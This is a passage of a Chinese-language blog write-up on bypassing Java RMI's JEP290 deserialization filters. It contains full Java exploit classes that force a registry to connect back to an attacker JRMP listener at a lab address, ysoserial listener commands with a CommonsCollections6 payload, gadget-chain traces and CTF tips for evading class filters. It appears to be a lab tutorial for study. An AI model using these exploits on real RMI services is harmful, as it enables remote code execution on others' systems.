class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient_bypass_jep_jdk231.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient_bypass_jep_jdk231.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>RMIRegistryExploit_bypass_jep_jdk231.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIRegistryExploit_bypass_jep_jdk231</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">TrustAllSSL</span> <span class="keyword">implements</span> <span class="title class_">X509TrustManager</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> X509Certificate[] ANY_CA = &#123;&#125;;</span><br><span class="line">        <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123; <span class="keyword">return</span> ANY_CA; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(<span class="keyword">final</span> X509Certificate[] c, <span class="keyword">final</span> String t)</span> &#123; <span class="comment">/* Do nothing/accept all */</span> &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(<span class="keyword">final</span> X509Certificate[] c, <span class="keyword">final</span> String t)</span> &#123; <span class="comment">/* Do nothing/accept all */</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RMISSLClientSocketFactory</span> <span class="keyword">implements</span> <span class="title class_">RMIClientSocketFactory</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> Socket <span class="title function_">createSocket</span><span class="params">(String host, <span class="type">int</span> port)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">SSLContext</span> <span class="variable">ctx</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line">                ctx.init(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">TrustManager</span>[] &#123;<span class="keyword">new</span> <span class="title class_">TrustAllSSL</span>()&#125;, <span class="literal">null</span>);</span><br><span class="line">                <span class="type">SSLSocketFactory</span> <span class="variable">factory</span> <span class="operator">=</span> ctx.getSocketFactory();</span><br><span class="line">                <span class="keyword">return</span> factory.createSocket(host, port);</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;192.168.2.4&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> Integer.parseInt(<span class="string">&quot;1099&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;192.168.2.4:2333&quot;</span>;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(host, port);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            registry.list();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ConnectIOException ex) &#123;</span><br><span class="line">            registry = LocateRegistry.getRegistry(host, port, <span class="keyword">new</span> <span class="title class_">RMISSLClientSocketFactory</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ensure payload doesn&#x27;t detonate during construction or deserialization</span></span><br><span class="line">        exploit(registry, command);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exploit</span><span class="params">(<span class="keyword">final</span> Registry registry,  <span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ExecCheckingSecurityManager</span>().callWrapped(<span class="keyword">new</span> <span class="title class_">Callable</span>&lt;Void&gt;()&#123;<span class="keyword">public</span> Void <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">JRMPClient_bypass_jep_jdk231</span> <span class="variable">jrmpclient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JRMPClient_bypass_jep_jdk231</span>();</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> jrmpclient.getObject(command);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                JEP_Naming.lookup(registry,remote);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://baicany.github.io/images/1586953-20221003163717886-1731188862.png" alt="img"></p>
+<h3 id="针对CheckAccess绕过攻击环境演示"><a href="#针对CheckAccess绕过攻击环境演示" class="headerlink" title="针对CheckAccess绕过攻击环境演示"></a>针对CheckAccess绕过攻击环境演示</h3><p>首先<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 2333 CommonsCollections6 calc</code></p>
+<p><img src="https://baicany.github.io/images/1586953-20221003164431995-231095052.png" alt="img"></p>
+<p>模拟开启一个rmi服务</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003164445925-1600303374.png" alt="img"></p>
+<p>运行RMIRegistryExploit_bypass_jep_jdk231.java进行攻击</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003164517284-2056038898.png" alt="img"></p>
+<h2 id="filterCheck绕过攻击UnicastRef类-jdk231"><a href="#filterCheck绕过攻击UnicastRef类-jdk231" class="headerlink" title="filterCheck绕过攻击UnicastRef类 &lt; jdk231"></a>filterCheck绕过攻击UnicastRef类 &lt; jdk231</h2><p>上面讲解了一种绕过RegistryImpl.checkAccess的攻击，所以如果不是本地地址去bind注册端恶意操作的时候，则会触发checkAccess的限制</p>
+<p>这里继续讲解filterCheck的绕过，而对于filterCheck的绕过的话，下面的白名单里的类虽然很少，但是还是存在方法可以绕过的</p>
+<p>我们客户端去跟注册端或者服务端进行bind或者lookup的操作的时候，实际上都是通过构造unicastRef中LiveRef所封装的 host、端口等信息，我们就可以发起一个任意的 JRMP 连接请求，而恰好unicastRef正好是在filterCheck白名单中，那么如果可以控制unicastRef发起请求的话实际上就能绕过JEP290的限制</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">return</span> <span class="string">String.class</span> <span class="type">!=</span> <span class="string">var2</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Number.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Remote.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!Proxy.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!UnicastRef.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!RMIClientSocketFactory.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!RMIServerSocketFactory.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!ActivationID.class.isAssignableFrom(var2)</span> </span><br><span class="line"><span class="string">&amp;&amp;</span> <span class="type">!UID.class.isAssignableFrom(var2)</span> <span class="string">?</span> <span class="attr">Status.REJECTED :</span> <span class="string">Status.ALLOWED</span></span><br></pre></td></tr></table></figure>
+
+<p>上述提及的绕过方法，这其实就是ysoserial中的payloads.JRMPClient的原理，下面大致过一下流程</p>
+<p>先观察payloads.JRMPClient利用链如下，可以看到反序列化入口点是UnicastRef的readExternal方法</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">* UnicastRef<span class="selector-class">.newCall</span>(RemoteObject, Operation[], int, long)</span><br><span class="line">* DGCImpl_Stub<span class="selector-class">.dirty</span>(ObjID[], long, Lease)</span><br><span class="line">* DGCClient<span class="variable">$EndpointEntry</span><span class="selector-class">.makeDirtyCall</span>(Set&lt;RefEntry&gt;, long)</span><br><span class="line">* DGCClient<span class="variable">$EndpointEntry</span><span class="selector-class">.registerRefs</span>(List&lt;LiveRef&gt;)</span><br><span class="line">* DGCClient<span class="selector-class">.registerRefs</span>(Endpoint, List&lt;LiveRef&gt;)</span><br><span class="line">* LiveRef<span class="selector-class">.read</span>(ObjectInput, boolean)</span><br><span class="line">* UnicastRef<span class="selector-class">.readExternal</span>(ObjectInput)</span><br><span class="line">*</span><br><span class="line">* Thread<span class="selector-class">.start</span>()</span><br><span class="line">* DGCClient<span class="variable">$EndpointEntry</span>.&lt;init&gt;(Endpoint)</span><br><span class="line">* DGCClient<span class="variable">$EndpointEntry</span><span class="selector-class">.lookup</span>(Endpoint)</span><br><span class="line">* DGCClient<span class="selector-class">.registerRefs</span>(Endpoint, List&lt;LiveRef&gt;)</span><br><span class="line">* LiveRef<span class="selector-class">.read</span>(ObjectInput, boolean)</span><br><span class="line">* UnicastRef<span class="selector-class">.readExternal</span>(ObjectInput)</span><br></pre></td></tr></table></figure>
+
+<p>模拟反序列化操作，先开启监听<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 2333 CommonsCollections6 calc</code></p>
+<p><img src="https://baicany.github.io/images/1586953-20221003144105715-834448889.png" alt="img"></p>
+<p>然后反序列化ysoserial.payloads.JRMPClient，这里会在sun.rmi.server.UnicastRef#readExternal停下，如下图所示</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003144006745-2011501413.png" alt="img"></p>
+<p>获取到的是ObjectInput对象，所以这里的判断分支走的是下面的DGCClient.registerRefs(var2, Arrays.asList(var5));</p>
+<p>同时将相关的TCPEndpoint对象读取，其中要请求的地址就是我们的恶意服务端127.0.0.1:2333</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003144431826-125293859.png" alt="img"></p>
+<p>接着其中的sun.rmi.transport.DGCClient#registerRefs方法继续发起sun.rmi.transport.DGCClient.EndpointEntry#lookup请求，</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003144538500-655754011.png" alt="img"></p>
+<p>在lookup方法中进行sun.rmi.transport.DGCClient.EndpointEntry实例化，参数为TcpEndPoint对象</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003144625226-1005465716.png" alt="img"></p>
+<p>实例化EndpointEntry过程中，创建了一个LiveRef对象，接着创建了对应的createProxy中DGC_Stub和DGC_Skel</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003145126788-1637188151.png" alt="img"></p>
+<p><img src="https://baicany.github.io/images/1586953-20221003145210494-115068629.png" alt="img"></p>
+<p>lookup完成了之后得到一个EndpointEntry，又会回到sun.rmi.transport.DGCClient#registerRefs，接着执行EndpointEntry.registerRefs</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003145730742-1540672958.png" alt="img"></p>
+<p>这里实际上就是通过代理DGCImpl_Stub来发起网络请求，通过sun.rmi.transport.StreamRemoteCall#executeCall请求的目标就是我们的恶意服务端，最终导致反序列化readObject返回的数据，最后命令执行</p>
+<p>其中触发sun.rmi.transport.DGCClient.EndpointEntry#makeDirtyCall -&gt; java.rmi.dgc.DGC#dirty -&gt; java.rmi.server.RemoteRef#invoke(java.rmi.server.RemoteCall) -&gt; sun.rmi.transport.StreamRemoteCall#executeCall</p>
+<p><img src="https://baicany.github.io/images/1586953-20221003150527529-112534649.png" alt="img"></p>
+<p>过程总结图如下所示</p>
+<p><img src="https://baicany.github.io/images/1586953-20221004142114672-1834810197.png" alt="img"></p>
+<h3 id="CTF中可能出现的"><a href="#CTF中可能出现的" class="headerlink" title="CTF中可能出现的"></a>CTF中可能出现的</h3><p>1、在ysoserial.payloads.JRMPClient#getObject中什可以看到，构造的对象是通过<code>Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;Registry.class&#125;, obj);</code>，动态代理来实现，实际上这里的动态代理其实都可以不用，直接返回<code>RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</code>这个obj对象同样可以进行触发</p>
+<p>2、第二点就是如果RemoteObjectInvocationHandler被过滤的话，其实还可以寻找RemoteObject的其他子类来构造，很多子类都满足要求，比如如下的，只要满足序列化的时候能够将其中的UnicastRef进行保存，最终反序列化的时候触发的还是UnicastRef的操作即可</p>
+<p>RemoteObjectInvocationHandler<br>RMIConntionImpl_Stub<br>DGCImpl_Stub<br>RmiServerImpl_Stub<br>ReferenceWrapper_Stub<br>…</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/07/28/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="rmi反序列化">
+                  <i class="fa fa-angle-left"></i> rmi反序列化
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/08/10/cb/" rel="next" title="cb链">
+                  cb链 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baicany</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right"},"mobile":{"show":true}});</script></body>
+</html>
